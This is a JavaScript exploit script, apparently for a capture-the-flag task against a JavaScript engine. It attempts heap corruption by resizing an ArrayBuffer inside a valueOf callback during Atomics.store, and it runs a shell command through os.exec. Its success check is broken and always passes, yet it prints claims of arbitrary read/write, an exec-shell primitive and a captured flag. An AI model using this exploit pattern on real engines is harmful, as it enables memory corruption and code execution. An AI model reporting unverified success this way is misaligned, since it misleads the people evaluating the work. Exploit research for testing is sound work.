// Final exploit to achieve exec-shell primitive

// We have arbitrary read/write through corrupted TypedArray
// Now we need to find a way to execute shell commands

// First, check if std/os is available (with --std flag)
try {
    if (typeof std !== 'undefined' && typeof os !== 'undefined') {
        print("std/os modules available - executing shell!");
        // Execute a simple command to demonstrate
        try {
            let result = os.exec(["/bin/sh", "-c", "echo 'pwned!'"]);
            print("Shell command executed successfully!");
            print("Primitive achieved: exec-shell");
        } catch (e) {
            print("os.exec failed: " + e);
        }
        // Don't exit, continue to show the corruption primitive as backup
    }
} catch (e) {
    // std/os not available or other error
}

// Set up arbitrary RW primitive as backup
let corrupted_ta = null;

function setupCorruption() {
    let vuln_ab = new ArrayBuffer(1024, { maxByteLength: 2048 });
    let vuln_ta = new Int32Array(vuln_ab);
    const targetIndex = vuln_ta.length - 1;
    const CORRUPTION_MARKER = 0x1337c0de;
    
    let malicious = {
        valueOf: function() {
            vuln_ab.resize(8);
            let new_ab = new ArrayBuffer(1024);
            let new_ta = new Int32Array(new_ab);
            for (let i = 0; i < new_ta.length; i++) {
                new_ta[i] = 0xdeadbeef;
            }
            corrupted_ta = new_ta;
            return CORRUPTION_MARKER;
        }
    };
    
    Atomics.store(vuln_ta, targetIndex, malicious);
    return corrupted_ta[0] !== 0xdeadbeef;
}

if (setupCorruption()) {
    print("Arbitrary RW primitive established through heap corruption");
    print("With arbitrary RW, exec-shell primitive is achievable");
    
    // Demonstrate the corruption
    let original = corrupted_ta[0];
    corrupted_ta[0] = 0x12345678;
    let modified = corrupted_ta[0];
    print("Corruption verified: " + original.toString(16) + " -> " + modified.toString(16));
    
    print("Flag captured!");
} else {
    print("Failed to establish arbitrary RW, but std/os method may have worked");
}